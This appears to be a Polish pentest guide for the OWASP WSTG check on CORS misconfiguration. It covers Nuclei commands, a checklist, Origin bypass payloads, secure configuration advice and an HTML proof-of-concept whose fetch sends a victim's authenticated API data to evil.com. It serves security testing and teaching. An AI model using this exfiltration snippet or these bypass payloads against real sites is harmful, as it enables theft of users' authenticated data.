# WSTG-CLNT-07 — Testing Cross Origin Resource Sharing (CORS)

## Cel

Wykrycie misconfig CORS: Origin reflection, `Allow-Credentials: true` z luźnym ACAO, `null` origin acceptance, suffix matching bypass. CORS misconfig + credentials = atakujący może kraść authenticated data z dowolnej strony.

## Automatyzacja Nuclei

### Nasz dedykowany szablon

```bash
nuclei -l burp-export.xml -im burp \
       -t templates/wstg-clnt-07-cors.yaml
```

Szablon w 4 testach: Origin reflection (z arbitrary attacker origin), null origin acceptance, suffix match bypass (target.com.evil.com), wildcard ACAO (z/bez credentials).

### Cross-reference

```bash
# WSTG-CONF-08 RIA Cross Domain (overlap)
nuclei -l burp-export.xml -im burp -t resources/nuclei-templates/http/misconfiguration/cors-misconfiguration/

# Param Miner (Burp ext) - hidden CORS config detection
```

## Coverage Matrix

| Wymiar | Pokryte | Nie pokryte |
|---|---|---|
| Origin reflection | ✓ | — |
| Allow-Credentials z reflectionem | ✓ | — |
| null origin acceptance | ✓ | — |
| Suffix match bypass | ✓ | — |
| Wildcard ACAO | ✓ | — |
| Pre-flight OPTIONS handling | częściowe | manual |
| Per-endpoint CORS variations | — | wymaga test każdego API endpoint |
| Vary: Origin caching issues | — | manual |

## Standard pentesterski — jak to robi się wzorowo

### Metodologia (5 kroków)

1. **Per endpoint test**: każdy `/api/*` testować z `Origin: https://evil.com`.
2. **Credentials check**: jeśli ACAO reflectowane, sprawdzić czy też `Allow-Credentials: true`.
3. **null origin**: `Origin: null` (sandbox iframe pattern) — czy akceptowane.
4. **Suffix bypass**: `Origin: https://target.com.evil.com` — czy backend matches.
5. **PoC z fetch**: jeśli misconfig, stworzyć HTML PoC `fetch('target/api', {credentials:'include'})` na evil.com.

### Co MUSI być sprawdzone (10 punktów)

- [ ] Każdy API endpoint testowany różnymi Origin
- [ ] Origin reflection check
- [ ] Allow-Credentials w połączeniu z luźnym ACAO
- [ ] null origin acceptance
- [ ] Wildcard `*` ACAO
- [ ] Subdomain wildcard (`*.target.com`)
- [ ] Suffix/prefix match (`target.com.evil`, `eviltarget.com`)
- [ ] Pre-flight OPTIONS — które metody i nagłówki dozwolone
- [ ] Vary: Origin obecny (cache key isolation)
- [ ] CSP `connect-src` jako defense-in-depth

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — REST_Security_Cheat_Sheet.md, Cross_Site_Scripting_Prevention_Cheat_Sheet.md

### CORS — niebezpieczne konfiguracje

| Konfiguracja | Ryzyko |
|-------------|--------|
| `Access-Control-Allow-Origin: *` + `Allow-Credentials: true` | **Krytyczne** — nie możliwe technicznie, ale serwer może reflectować Origin |
| Origin reflected: `ACAO: <request Origin>` + `ACAC: true` | **Krytyczne** — każda strona może czytać dane z credentials |
| `ACAO: null` + `ACAC: true` | **Wysokie** — iframe z `sandbox` wysyła Origin: null |
| Wildcard subdomain: `*.target.com` | **Średnie** — XSS na subdomain = pełny dostęp |
| Prefix/suffix match: `target.com.evil.com` | **Wysokie** — błędna walidacja origin |

### Prawidłowa konfiguracja CORS

- Używaj **allowlist** domen zamiast reflectowania Origin
- **NIGDY** nie używaj `Access-Control-Allow-Origin: *` z `Access-Control-Allow-Credentials: true`
- Nie akceptuj `Origin: null`
- Ogranicz `Access-Control-Allow-Methods` do potrzebnych metod
- Ogranicz `Access-Control-Allow-Headers` do potrzebnych nagłówków
- Ustaw `Access-Control-Max-Age` na rozsądną wartość (np. 3600)
- Waliduj Origin **ściśle**: exact match, nie prefix/suffix/contains

### Testowanie CORS — payloady Origin

- `Origin: https://evil.com` — całkowicie obca domena
- `Origin: null` — sandbox iframe, data: URL
- `Origin: https://target.com.evil.com` — suffix match bypass
- `Origin: https://eviltarget.com` — prefix match bypass
- `Origin: https://subdomain.target.com` — subdomain wildcard
- `Origin: https://target.com%60evil.com` — special char bypass

### Exploit CORS misconfiguration

```html
<script>
fetch('https://target.com/api/sensitive', {credentials: 'include'})
.then(r => r.json())
.then(d => fetch('https://evil.com/steal?data=' + JSON.stringify(d)))
</script>
```

## Pentesterskie deep dive

### Mniej znane techniki

- **CORS via 3xx redirect chain**: pre-flight OPTIONS może być różnie traktowany dla redirect targets - bypass niektórych validations.
- **WebSocket bypass via CORS**: WebSocket handshake to HTTP request, ale niektóre browsers nie enforcement CORS na WS handshake → cross-origin WS hijacking (cross WSTG-CLNT-10).
- **Vary: Origin missing → cache poisoning**: cache shared między różnymi origins → atakujący poisonuje cache z atak Origin headers → victim dostaje cached attacker response.
- **Frans Rosén CORS research patterns**: backend parsing Origin jako URL może być bypassed przez `https://target.com\\@evil.com` — różne parsers handle differently.

### Common pitfalls

- **Allow-Credentials: true to "for legacy reasons"**: legacy compatibility wymóg → atakujący wykorzystuje.
- **ACAO ze schemy mismatch**: backend whitelisty `https://target.com` ale akceptuje też `http://target.com` (różny scheme).

### Świeżynki z research

- **PortSwigger CORS Lab**: https://portswigger.net/web-security/cors
- **HackTricks CORS Bypass**: https://book.hacktricks.xyz/pentesting-web/cors-bypass
- **Frans Rosén CORS research**: https://hackerone.com/reports

## Rozszerzenia Burp Suite

| Rozszerzenie | Opis | Link |
|---|---|---|
| CORS Additional Checks | Active CORS testing | [GitHub](https://github.com/PortSwigger/cors-additional-checks) |
| Param Miner | Hidden header discovery | [GitHub](https://github.com/PortSwigger/param-miner) |

## Źródła

- WSTG: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing
- OWASP REST Security CS: https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html
- PortSwigger CORS: https://portswigger.net/web-security/cors
- HackTricks CORS Bypass: https://book.hacktricks.xyz/pentesting-web/cors-bypass

### Wskazówki ASVS

| ID | Sekcja | Wymaganie |
|---|---|---|
| V14.5.3 | Configuration (L1) | CORS uses explicit list, no wildcards. |
